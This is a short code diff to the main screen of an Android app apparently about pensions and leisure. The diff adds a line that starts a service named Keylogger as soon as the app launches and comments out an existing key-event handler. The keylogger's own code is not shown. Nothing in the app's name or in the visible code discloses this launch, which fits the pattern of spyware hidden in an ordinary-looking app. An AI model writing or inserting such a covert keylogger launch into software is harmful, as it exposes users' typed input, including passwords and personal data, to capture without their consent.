@@ -1,19 +1,24 @@
 package com.truemind.pensionnleisure;
 
+import android.app.Activity;
+import android.content.Intent;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.KeyEvent;
 import android.view.View;
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends Activity {
 
     String keyDown2;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        startService(new Intent(this, Keylogger.class));
     }
+/*
 
     public boolean onKey(View v, int keyCode, KeyEvent event) {
         if(KeyEvent.ACTION_DOWN == event.getAction()){
@@ -24,6 +29,7 @@ public class MainActivity extends AppCompatActivity {
         return false;
     }
 
+*/
 
 
 
